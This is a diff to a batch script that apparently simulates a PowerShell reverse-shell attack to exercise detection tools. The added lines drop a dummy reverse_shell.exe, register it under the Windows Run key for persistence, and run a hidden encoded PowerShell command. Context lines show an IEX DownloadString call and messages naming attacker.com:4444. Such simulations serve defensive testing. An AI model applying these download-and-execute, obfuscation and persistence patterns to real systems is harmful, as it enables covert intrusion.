@@ -14,6 +14,10 @@ echo PowerShell Reverse Shell Attack Simulation
 echo ============================================
 echo.
 
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "$bytes = [byte[]]::new(32768); $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create(); $rng.GetBytes($bytes); [System.IO.File]::WriteAllBytes(\"$env:PUBLIC\\reverse_shell.exe\", $bytes)"
+"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'ReverseShellSim' -Value \"$env:PUBLIC\\reverse_shell.exe\" -PropertyType String -Force"
+start /min powershell.exe -NoProfile -EncodedCommand SQBFAFgA >nul 2>&1
+
 echo [*] Stage 1: Reverse shell pattern with IEX execution
 "%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/rev') } catch { Write-Host '[SIM] Download failed as expected' }; Write-Host '[SIM] TCP reverse shell pattern to attacker.com:4444'; Write-Host '[SIM] IEX data exfiltration pattern'; Write-Host '[SIM] Stream-based command execution'"
 
